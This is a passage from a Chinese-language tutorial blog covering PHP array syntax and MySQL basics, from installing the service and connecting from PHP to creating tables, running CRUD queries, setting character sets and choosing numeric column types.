class="string">&quot;hello&quot;</span>&#125;</span><br></pre></td></tr></table></figure></li><li><p>可以使用中括号来包裹数据：</p><p>$变量 = [元素1 ，元素2 ， …];</p></li><li><p>隐形定义数组：给变量增加一个中括号，系统自动变成数组</p><p>$变量[] = 值 1;        //如果不提供小表也可以，系统自动生成（数字：从0开始）</p><p>$变量[下标] = 值  ; //中括号里面的内容称之为下标 key 该下标可以是字母 （单词） 或者数字，与变量命名的规则相似    如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr3</span>[] = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$arr3</span>[<span class="number">10</span>] = <span class="number">100</span>;</span><br><span class="line"><span class="variable">$arr3</span>[] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$arr3</span>[<span class="string">&#x27;key&#x27;</span>] = <span class="string">&#x27;key&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$arr3</span>);</span><br></pre></td></tr></table></figure><p>结果为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">int</span>(<span class="number">1</span>) [<span class="number">10</span>]=&gt; <span class="keyword">int</span>(<span class="number">100</span>) [<span class="number">11</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;1&quot;</span> [<span class="string">&quot;key&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;key&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>默认下标是当前前面最大的开始  如：第三行上的最大下标为10，所以第三行 <strong>$arr3[] = ‘1’</strong>; 下标为11   </p></li></ol><h1 id="数组定义语法-1"><a href="#数组定义语法-1" class="headerlink" title="数组定义语法"></a>数组定义语法</h1><ol><li><p>安装服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqld --install </span><br></pre></td></tr></table></figure></li><li><p>初始化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqld --initialize --console</span><br></pre></td></tr></table></figure></li><li><p>开启服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start mysql</span><br></pre></td></tr></table></figure></li><li><p>关闭服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net stop mysql</span><br></pre></td></tr></table></figure></li><li><p>登录mysql：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">enter password：（密码）</span><br></pre></td></tr></table></figure></li><li><p>修改密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter user &#39;root&#39;@&#39;localhost&#39; identified by &#39;新密码&#39;;</span><br></pre></td></tr></table></figure></li><li><p>标记删除mysql服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc delete mysql</span><br></pre></td></tr></table></figure><p><strong><a href="https://www.cnblogs.com/winton-nfs/p/11524007.html">安装参考</a></strong></p></li></ol><h1 id="my-ini配置文件"><a href="#my-ini配置文件" class="headerlink" title="my.ini配置文件"></a>my.ini配置文件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[client]</span><br><span class="line"># 设置mysql客户端默认字符集</span><br><span class="line">default-character-set&#x3D;utf8</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line"># 设置3306端口</span><br><span class="line">port &#x3D; 3306</span><br><span class="line"># 设置mysql的安装目录</span><br><span class="line">basedir&#x3D;D:\\web\\mysql-8.0.23</span><br><span class="line"># 允许最大连接数</span><br><span class="line">max_connections&#x3D;20</span><br><span class="line"># 服务器端使用的字符集默认为8比特编码的latin1字符集</span><br><span class="line">character-set-server&#x3D;utf8</span><br><span class="line"># 创建新表时将使用的默认存储引擎</span><br><span class="line">default-storage-engine&#x3D;INNODB</span><br><span class="line">default_authentication_plugin&#x3D;mysql_native_password</span><br></pre></td></tr></table></figure><h1 id="PHP测试连接mysql"><a href="#PHP测试连接mysql" class="headerlink" title="PHP测试连接mysql"></a>PHP测试连接mysql</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;mysql test&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$dbhost &#x3D; &#39;localhost&#39;; &#x2F;&#x2F;mysql服务器主机地址</span><br><span class="line">$dbuser &#x3D; &#39;root&#39;; &#x2F;&#x2F;mysql用户名</span><br><span class="line">$dbpass &#x3D; &#39;123&#39;; &#x2F;&#x2F;mysql用户名密码</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 创建连接</span><br><span class="line">$conn &#x3D; new mysqli($dbhost, $dbuser, $dbpass);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 检测连接</span><br><span class="line">if($conn-&gt;connect_error)</span><br><span class="line">&#123;</span><br><span class="line">    die(&quot;连接失败：&quot; . $conn-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;连接成功！&quot;;</span><br></pre></td></tr></table></figure><h1 id="MySQL服务端框架"><a href="#MySQL服务端框架" class="headerlink" title="MySQL服务端框架"></a>MySQL服务端框架</h1><p>MySQL服务端架构有以下几层</p><ol><li>数据库管理系统（最外层）：DBMS，专门管理服务器端的所有内容</li><li>数据库（第二层）：DB，专门用于存储数据的仓库（可以有很多个）</li><li>二维数据表（第三层）：Table，专门用于存储具体实体的数据</li><li>字段（第四层）：Field，具体存储莫种类型的数据（实际存储单元）</li></ol><p>数据库中常用的几个关键字</p><p><strong>row：行</strong></p><p><strong>column：列（field）</strong></p><h1 id="数据库基本操作"><a href="#数据库基本操作" class="headerlink" title="数据库基本操作"></a>数据库基本操作</h1><p>数据库是数据存储的最外层（最大单元）</p><h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><p>基本语法：<strong>create database 数据库名字 [库选项];</strong></p><p>库选项：数据库相关属性</p><ol><li><p>字符集：charset 字符集，代表着当前数据库下的所有表存储的数据默认指定的字符集（如果当前不指定，那么采用 DBMS 默认的）</p></li><li><p>校对集：collate 校对集</p><p>create database 数据库名字 charset 字符集名称</p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database mydatabase1 charset gbk;</span><br></pre></td></tr></table></figure></li></ol><h2 id="显示数据库"><a href="#显示数据库" class="headerlink" title="显示数据库"></a>显示数据库</h2><p>每当用通过通过 SQL 指令创建一个数据库，那么系统就会产生一个对应的存储数据的文件夹</p><h3 id="显示全部"><a href="#显示全部" class="headerlink" title="显示全部"></a>显示全部</h3><p>基本语法：<strong>show databases</strong></p><h3 id="显示部分"><a href="#显示部分" class="headerlink" title="显示部分"></a>显示部分</h3><p>基本语法：<strong>show databases like ‘匹配模式’；</strong></p><p><strong>_<strong>：匹配当前位置</strong>单个</strong>字符</p><p><strong>%<strong>：匹配指定位置</strong>多个</strong>字符</p><p>例如：</p><p>获取以 my 开头的全部数据库：… ‘my%’;</p><p>获取以 m 开头，后面第一个字母不确定，最后为 database 的数据库：… ‘m_database’;</p><p>获取以 database 结尾打的数据库：’%database’;</p><h3 id="显示数据库创建语句"><a href="#显示数据库创建语句" class="headerlink" title="显示数据库创建语句"></a>显示数据库创建语句</h3><p>基本语法：<strong>show create database 数据库名字;</strong></p><h3 id="选择数据库"><a href="#选择数据库" class="headerlink" title="选择数据库"></a>选择数据库</h3><p>基本语法：<strong>use 数据库名字;</strong></p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use mydatabase</span><br></pre></td></tr></table></figure><p>出现 <strong>database changed</strong> 表示当前已经进入到指定的数据库环境</p><h3 id="修改数据库"><a href="#修改数据库" class="headerlink" title="修改数据库"></a>修改数据库</h3><p>修改数据库字符集（库选项）：字符集和校对集</p><p>基本语法：<strong>alter database 数据库名字 charset (=) 字符集;</strong></p><h3 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h3><p>基本语法：<strong>drop database 数据库名字;</strong></p><h1 id="数据表操作"><a href="#数据表操作" class="headerlink" title="数据表操作"></a>数据表操作</h1><h2 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h2><h3 id="普通创建表"><a href="#普通创建表" class="headerlink" title="普通创建表"></a>普通创建表</h3><p>基本语法：<strong>create table 表名(字段名 字段类型 [字段属性], 字段名 字段类型 [字段属性],… );</strong></p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-- 任何位置</span><br><span class="line">create table mydatabase.class(</span><br><span class="line">name varchar(10)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">-- 指定位置</span><br><span class="line">use mydatabase</span><br><span class="line">creat table teacher(</span><br><span class="line">name varchar(10)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>表选项：与数据库选项类似</p><ol><li>engine：存储引擎，MySQL提供的具体存储数据的方式，默认有一个innodb</li><li>charset：字符集（只对当前自己的表有效，级别比数据库高）</li><li>collate：校对集</li></ol><h3 id="复制已有表结构"><a href="#复制已有表结构" class="headerlink" title="复制已有表结构"></a>复制已有表结构</h3><p>从已经存在的表复制一份（<strong>只复制结构</strong>：如果表中有数据，数据不复制）</p><p>基本语法：<strong>create table 新表名 like 表名;</strong>        //只要使用数据库.表名，就可以在任何数据库下访问其他数据库的表名    如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use mydatabase2</span><br><span class="line">create table stduent like mydatabase.teacher;</span><br></pre></td></tr></table></figure><h2 id="显示数据表"><a href="#显示数据表" class="headerlink" title="显示数据表"></a>显示数据表</h2><p>每当一张表创建，那么就会在相应的数据库下创建一些文件（与存储引擎有关）</p><h3 id="显示所有表"><a href="#显示所有表" class="headerlink" title="显示所有表"></a>显示所有表</h3><p><strong>基本语法：show tables;</strong></p><h3 id="匹配显示表"><a href="#匹配显示表" class="headerlink" title="匹配显示表"></a>匹配显示表</h3><p><strong>基本语法：show tables like ‘匹配模式’;</strong></p><h2 id="显示表结构"><a href="#显示表结构" class="headerlink" title="显示表结构"></a>显示表结构</h2><p>本质含义：显示表中所包含的字段信息（名字，类型，属性）</p><p><strong>describe 表名;</strong></p><p><strong>desc 表名;</strong></p><p><strong>show columns from 表名;</strong></p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-- 输入</span><br><span class="line">desc class;</span><br><span class="line"></span><br><span class="line">-- 结果</span><br><span class="line">+-------+-------------+------+-----+---------+-------+</span><br><span class="line">| Field | Type        | Null | Key | Default | Extra |</span><br><span class="line">+-------+-------------+------+-----+---------+-------+</span><br><span class="line">| name  | varchar(10) | YES  |     | NULL    |       |</span><br><span class="line">+-------+-------------+------+-----+---------+-------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line">-- Field   &#x3D;&gt; 字段名字</span><br><span class="line">-- Type    &#x3D;&gt; 字段类型</span><br><span class="line">-- Null    &#x3D;&gt; 值是否允许为空；yes代表允许</span><br><span class="line">-- Key   &#x3D;&gt; 索引</span><br><span class="line">-- Default &#x3D;&gt; 默认值：NULL表示默认为NULL</span><br><span class="line">-- Extra   &#x3D;&gt; 额外的属性</span><br></pre></td></tr></table></figure><h2 id="显示表创建语句"><a href="#显示表创建语句" class="headerlink" title="显示表创建语句"></a>显示表创建语句</h2><p>查看数据表创建时的语句：此语句看到的结果已经不是用户之前自己输入的。</p><p>基本语法：<strong>show create table 表名;</strong></p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-- 输入</span><br><span class="line">show create table class;</span><br><span class="line"></span><br><span class="line">-- 结果</span><br><span class="line">+-------+-------------------------------------------------------------------------------+</span><br><span class="line">| Table | Create Table                                                                  |</span><br><span class="line">+-------+-------------------------------------------------------------------------------+</span><br><span class="line">| class | CREATE TABLE &#96;class&#96; (</span><br><span class="line">  &#96;name&#96; varchar(10) DEFAULT NULL</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8 |</span><br><span class="line">+-------+-------------------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>MySQL中有多种语句结束符</p><p>; 与 \g 所表示效果一致</p><p>\G 字段在左侧竖着，数据在右侧横着</p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-- 输入</span><br><span class="line">show table class\G</span><br><span class="line"></span><br><span class="line">-- 结果</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">       Table: class</span><br><span class="line">Create Table: CREATE TABLE &#96;class&#96; (</span><br><span class="line">  &#96;name&#96; varchar(10) DEFAULT NULL</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h1 id="数据基础操作"><a href="#数据基础操作" class="headerlink" title="数据基础操作"></a>数据基础操作</h1><h2 id="插入操作"><a href="#插入操作" class="headerlink" title="插入操作"></a>插入操作</h2><p>本质含义：将 数据以 SQL 的形式存储到指定的数据表 （字段）里面</p><p>基本语法：</p><p><strong>insert into 表名[(字段列表)] values(对应字段列表)</strong></p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-- 创建数据表</span><br><span class="line">create table my_teacher(</span><br><span class="line">name varchar(10),</span><br><span class="line">age int</span><br><span class="line">)charset utf8;</span><br><span class="line"></span><br><span class="line">-- 插入数据到数据表</span><br><span class="line">insert into my_teacher (name,age) values(&#39;Jack&#39;,30);</span><br></pre></td></tr></table></figure><p>注意：后面 values 中对应的值列表只需要与前面的字段列表相对应即可</p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into my_teacher (age,name) values(31,&#39;Peter&#39;);</span><br></pre></td></tr></table></figure><h2 id="查询操作"><a href="#查询操作" class="headerlink" title="查询操作"></a>查询操作</h2><p>查询表中全部数据：<strong>select * from 表名;</strong></p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-- 获取所有数据</span><br><span class="line">select * from my_teacher;</span><br><span class="line"></span><br><span class="line">-- 结果</span><br><span class="line">+-------+------+</span><br><span class="line">| name  | age  |</span><br><span class="line">+-------+------+</span><br><span class="line">| Jack  |   30 |</span><br><span class="line">| Peter |   31 |</span><br><span class="line">+-------+------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>查询表中部分字段：<strong>select 字段列表 from 表名;</strong>                <strong>//字段列表使用逗号 “,” 隔开</strong></p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-- 获取指定字段数据</span><br><span class="line">select name from my_teacher;</span><br><span class="line"></span><br><span class="line">-- 结果</span><br><span class="line">+-------+</span><br><span class="line">| name  |</span><br><span class="line">+-------+</span><br><span class="line">| Jack  |</span><br><span class="line">| Peter |</span><br><span class="line">+-------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>简单条件查询数据：<em><em>select 字段列表/</em> from 表名 where 字段名 = 值;</em>*            //mysql 中没有==符号</p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-- 获取年龄为30岁的人的名字</span><br><span class="line">select name from my_teacher where age &#x3D; 30;</span><br><span class="line"></span><br><span class="line">-- 结果</span><br><span class="line">+------+</span><br><span class="line">| name |</span><br><span class="line">+------+</span><br><span class="line">| Jack |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="删除操作"><a href="#删除操作" class="headerlink" title="删除操作"></a>删除操作</h2><p>基本语法：<strong>delete from 表名 [where 条件];</strong>                //如果没有 where 条件，系统将会删除该表全部的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 删除年龄为30岁的老师</span><br><span class="line">delete from my_teacher where age &#x3D; 30;</span><br></pre></td></tr></table></figure><h2 id="更新操作（数据修改）"><a href="#更新操作（数据修改）" class="headerlink" title="更新操作（数据修改）"></a>更新操作（数据修改）</h2><p>基本语法：<strong>update 表名 set 字段名 = 新值 [where 条件]</strong>        //如果没有where，那么所有表中对应的字段都会被修改成统一值    如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 更新年龄Hank</span><br><span class="line">update my_teacher set age &#x3D; 32 where name &#x3D; &#39;Hank&#39;;</span><br></pre></td></tr></table></figure><h1 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h1><h2 id="设置客户端所有字符集"><a href="#设置客户端所有字符集" class="headerlink" title="设置客户端所有字符集"></a>设置客户端所有字符集</h2><p>如果直接通过 cmd 下的 mysql.exe 进行中文数据插入，那么<strong>可能</strong>出错</p><p>出错原因：</p><ol><li>用户是通过 mysql.exe 来操作 mysqld.exe</li><li>真正的 SQL 执行时 MySQLd.exe 来执行</li><li>mysql.exe 将数据传入 mysqld.exe 的时候，没有告知其对应的符号规则（字符集），mysqld 也没有能力自己判断，就会使用默认的字符集</li></ol><p>解决方案：mysql.exe 客户端再进行数据操作之前将自己所使用的字符集告诉 mysqld</p><p>cmd 下的 mysql.exe 默认都只有一个字符集</p><p>快捷方式：<strong>set names 字符集;</strong></p><h5 id="深层原理：客户端，服务端，连接层"><a href="#深层原理：客户端，服务端，连接层" class="headerlink" title="深层原理：客户端，服务端，连接层"></a>深层原理：客户端，服务端，连接层</h5><p>mysql.exe 与 mysqld.exe 之间的处理关系一共分为三层</p><p>客户端传入数据给服务端：client</p><p>服务端返回数据给客户端：server</p><p>客户端与服务端之间的连接：collection</p><p>set names 字符集 本质：就是一次性大同三层关系的字符集，变得一致。</p><p><strong>即：改变 character_set_client   character_set_connection   character_set_results 这三个的 value</strong></p><p>在系统中有三个变量来记录这三个关系对应的字符集</p><h5 id="查看系统保存的三种关系处理字符集"><a href="#查看系统保存的三种关系处理字符集" class="headerlink" title="查看系统保存的三种关系处理字符集"></a>查看系统保存的三种关系处理字符集</h5><p>基本语法：<strong>show variables like ‘character_set_%’;</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-- 结果</span><br><span class="line">+--------------------------+-------------------------------------+</span><br><span class="line">| Variable_name            | Value                               |</span><br><span class="line">+--------------------------+-------------------------------------+</span><br><span class="line">| character_set_client     | utf8                                |</span><br><span class="line">| character_set_connection | utf8                                |</span><br><span class="line">| character_set_database   | gbk                                 |</span><br><span class="line">| character_set_filesystem | binary                              |</span><br><span class="line">| character_set_results    | utf8                                |</span><br><span class="line">| character_set_server     | utf8                                |</span><br><span class="line">| character_set_system     | utf8                                |</span><br><span class="line">| character_sets_dir       | D:\web\mysql-8.0.23\share\charsets\ |</span><br><span class="line">+--------------------------+-------------------------------------+</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------</span><br><span class="line">-- character_set_client 客户端传入</span><br><span class="line">-- character_set_connection 连接层</span><br><span class="line">-- character_set_database 当前数据库存储方式</span><br><span class="line">-- character_set_results 返回的字符集</span><br></pre></td></tr></table></figure><h1 id="列类型（字段类型）"><a href="#列类型（字段类型）" class="headerlink" title="列类型（字段类型）"></a>列类型（字段类型）</h1><h2 id="整数型类型"><a href="#整数型类型" class="headerlink" title="整数型类型"></a>整数型类型</h2><h3 id="tinyint"><a href="#tinyint" class="headerlink" title="tinyint"></a>tinyint</h3><p>迷你整形，系统采用一个字节来保存的整形：一个字节 = 8 位，最大能表示的数值是 0-255</p><h3 id="smallint"><a href="#smallint" class="headerlink" title="smallint"></a>smallint</h3><p>小整形，系统采用两个字节来保存的整形，能表示 0-65535 之间</p><h3 id="mediumint"><a href="#mediumint" class="headerlink" title="mediumint"></a>mediumint</h3><p>中整形，采用三个字节来保存数据</p><h3 id="int"><a href="#int" class="headerlink" title="int"></a>int</h3><p>整形（标准整形），采用四个字节来保存数据</p><h3 id="bigint"><a href="#bigint" class="headerlink" title="bigint"></a>bigint</h3><p>大整形，采用八个字节来保存数据</p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-- 创建数据表</span><br><span class="line">create table my_int(</span><br><span class="line">int_1 tinyint,</span><br><span class="line">int_2 smallint,</span><br><span class="line">int_3 mediumint,</span><br><span class="line">int_4 int,</span><br><span class="line">int_5 bigint</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">-- 插入数据</span><br><span class="line">insert into my_int values(10,10000,1000000,100000,1000000000);</span><br><span class="line"></span><br><span class="line">insert into my_int values(255,10000,1000000,100000,1000000000);</span><br><span class="line">-- 结果</span><br><span class="line">ERROR 1264 (22003): Out of range value for column &#39;int_1&#39; at row 1</span><br><span class="line">-- 原因</span><br><span class="line">因为有负数存在 实际的范围为 -128-127</span><br></pre></td></tr></table></figure><h2 id="无符号标识设定"><a href="#无符号标识设定" class="headerlink" title="无符号标识设定"></a>无符号标识设定</h2><p>基本语法：<strong>在类型之后加上一个 unsigned                //（但无负数）</strong></p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-- 插入数据</span><br><span class="line">alter table my_int add int_6 tinyint unsigned first;</span><br><span class="line">insert into my_int values(255,127,10000,1000000,100000,1000000000);</span><br><span class="line">-- 查看数据</span><br><span class="line">select * from my_int;</span><br><span class="line">-- 结果</span><br><span class="line">+-------+-------+-------+---------+--------+------------+</span><br><span class="line">| int_6 | int_1 | int_2 | int_3   | int_4  | int_5      |</span><br><span class="line">+-------+-------+-------+---------+--------+------------+</span><br><span class="line">|  NULL |    10 | 10000 | 1000000 | 100000 | 1000000000 |</span><br><span class="line">|   255 |   127 | 10000 | 1000000 | 100000 | 1000000000 |</span><br><span class="line">+-------+-------+-------+---------+--------+------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h1 id="小数类型"><a href="#小数类型" class="headerlink" title="小数类型"></a>小数类型</h1><p>在 MySQL 中将小数分为两类：浮点型和定点型</p><h2 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h2><p>浮点型又称之为精度类型：是由一种可能丢失精度的数据类型，数据有可能不那么准确（尤其是在超出范围的时候）</p><h3 id="float"><a href="#float" class="headerlink" title="float"></a>float</h3><p>float 又称为单精度类型，系统提供 <strong>4 个字节</strong>用来存储数据，范围：10^38。但只能保证大概 <strong>7 个</strong>左右的精度（如果数据在七位数以内，那么基本是准确的，但超过 7 位数，那么就是不准确的）</p><p>基本语法：</p><ol><li>float：表示不指定小数位u的浮点数</li><li>float(M,D)：表示一共存储 M 个有效数字，其中小数部分占 D 位</li></ol><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-- 创建表</span><br><span class="line">create table my_float(</span><br><span class="line">    f1 float,</span><br><span class="line">    f2 float(10,2)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">-- 插入数据</span><br><span class="line">insert into my_float valuse(123.123,12345678.90);</span><br><span class="line"></span><br><span class="line">-- 结果</span><br><span class="line">+---------+-------------+</span><br><span class="line">| f1      | f2          |</span><br><span class="line">+---------+-------------+</span><br><span class="line">| 123.123 | 12345679.00 |</span><br><span class="line">+---------+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>注意：如果数据精度丢失，那么浮点型是按照四舍五入的方式进行计算，所以 f2 中数据变为12345679.00</p><p><strong>浮点型也能使用科学计数法进行存储数据</strong></p><h3 id="double"><a href="#double" class="headerlink" title="double"></a>double</h3><p>double 又称为双精度，系统提供 <strong>8 个字节</strong>来存储数据，表示范围更大：10^308，但精度也只有 <strong>15 位</strong>左右</p><h2 id="定点数"><a href="#定点数" class="headerlink" title="定点数"></a>定点数</h2><p>定点数：能够保证数据精确的小数（小数部分可能不精确，超出长度会四舍五入），<strong>整数部分一定精确</strong></p><h3 id="decimal"><a href="#decimal" class="headerlink" 